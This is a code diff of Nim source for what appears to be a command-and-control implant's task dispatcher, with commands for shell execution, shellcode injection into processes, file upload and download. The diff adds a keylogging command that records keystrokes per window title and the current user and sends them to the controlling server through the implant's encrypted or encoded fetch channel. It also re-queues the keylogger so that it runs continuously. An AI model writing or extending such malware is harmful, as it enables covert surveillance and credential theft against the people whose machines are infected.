@@ -1,10 +1,13 @@
 import asyncdispatch
 import base64
 import config
+import debug
 import json
 import http
+from sequtils import keepIf
 import strformat
 import strutils
+from tables import pairs
 import times
 import task
 from os import fileExists
@@ -16,6 +19,7 @@ import ../commands/curl
 import ../commands/drives
 import ../commands/download
 import ../commands/getenv
+import ../commands/keylog
 import ../commands/kill
 import ../commands/ls
 import ../commands/mkdir
@@ -28,8 +32,6 @@ import ../commands/shell
 import ../commands/shinject
 import ../commands/upload
 import ../commands/unsetenv
-
-import debug
 
 proc checkDate*(kdate: string) : bool =
    if cmp("yyyy-mm-dd", kdate) == 0:
@@ -108,10 +110,34 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                let spawnResult = await getenv.execute()
                temp = temp & $(spawnResult)
                debugMsg("Getenv has been called")
-            of "jobs":
+            of "jobkill":
+               # Keep all jobs where job id is not equal to passed in id to remove
+               var curParams = task.parameters
+               keepIf(jobSeq, proc(x: Job): bool = x.TaskId != curParams)
                jtemp.Success = true
+            of "jobs":
                for job in runningJobs:
                   temp = temp & $(job) & "\n"
+               jtemp.Success = true
+            of "keylog":
+               # Continously ship keystrokes every 30 seconds
+               debugMsg("Calling keylog")
+               let spawnResult = await keylog.execute()
+               debugMsg("Obtained spawnResult")
+               let user = await keylog.getUser()
+               for window, keystrokes in spawnResult.pairs:
+                  let shipJson = %*
+                     {
+                        "task_id": jtemp.TaskId,
+                        "user": user,
+                        "window_title": window,
+                        "keystrokes": keystrokes
+                     }
+                  let resp = when defined(AESPSK): await Fetch(curConfig, $(shipJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(shipJson)), true)
+                  debugMsg("resp for keystrokes for window: ", window, $(resp))
+               # Add to running jobs to continue keylogging
+               jobSeq.add(jtemp)
+               # spawnResult = Table[Windows, keystrokes]
             of "kill":
                let spawnResult = await kill.execute(parseInt(task.parameters))
                temp = temp & $(spawnResult)
@@ -148,7 +174,7 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
                debugMsg("spawned shell proc\n")
                temp = temp & spawnResult
             of "shinject":
-               let spawnResult = await shinject.execute(decode(parsedJsonTask["shellcode"].getStr()), parsedJsonTask["pid"].getInt())
+               let spawnResult = shinject.execute(decode(parsedJsonTask["shellcode"].getStr()), parsedJsonTask["pid"].getInt())
                debugMsg("spawned shinject proc\n")
                temp = temp & $(spawnResult)
             of "sleep":
